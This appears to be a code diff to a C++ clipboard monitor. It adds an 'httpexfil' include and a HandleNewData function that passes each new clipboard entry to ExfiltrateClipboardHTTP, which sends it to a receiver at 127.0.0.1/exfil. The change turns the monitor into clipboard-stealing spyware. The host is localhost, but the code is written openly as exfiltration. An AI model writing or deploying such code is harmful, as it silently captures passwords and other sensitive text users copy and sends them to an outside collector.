@@ -5,10 +5,32 @@
 
 #include <clipboard.h>
 #include <tools.h>
+#include <httpexfil.h>
 
 // Console ouput UTF_16 format, TODO REMOVE
 #include <fcntl.h>
 #include <io.h>
+
+void HandleNewData(std::wstring& data)
+{
+    std::string utf8_data = WStringToUtf8(data);
+    
+    std::wcout << L"[*] New Clipboard Content:\n\n" << data << L"\n\n";
+    std::wcout << L"Sending data to receiver...\n";
+
+    try
+    {
+        ExfiltrateClipboardHTTP(utf8_data, "127.0.0.1", "/exfil", 80);
+    }
+    catch(const std::exception& ex)
+    {
+        std::wcout << L"Error when sending data to receiver: " << ex.what() << "\n";
+    }
+    catch(...)
+    {
+        std::wcout << L"Unknown exception occured when sending data to receiver.\n";
+    }
+}
 
 int main() {
     // Console ouput UTF_16 format, TODO REMOVE
@@ -21,8 +43,9 @@ int main() {
     {
         std::wstring currentClipboard = GetClipboardText();
 
-        if(!currentClipboard.empty() && currentClipboard != lastClipboard) {
-            std::wcout << L"[*] New Clipboard Content:\n\n" << currentClipboard << L"\n\n";
+        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
+        {
+            HandleNewData(currentClipboard);  
             lastClipboard = currentClipboard;
         }
 
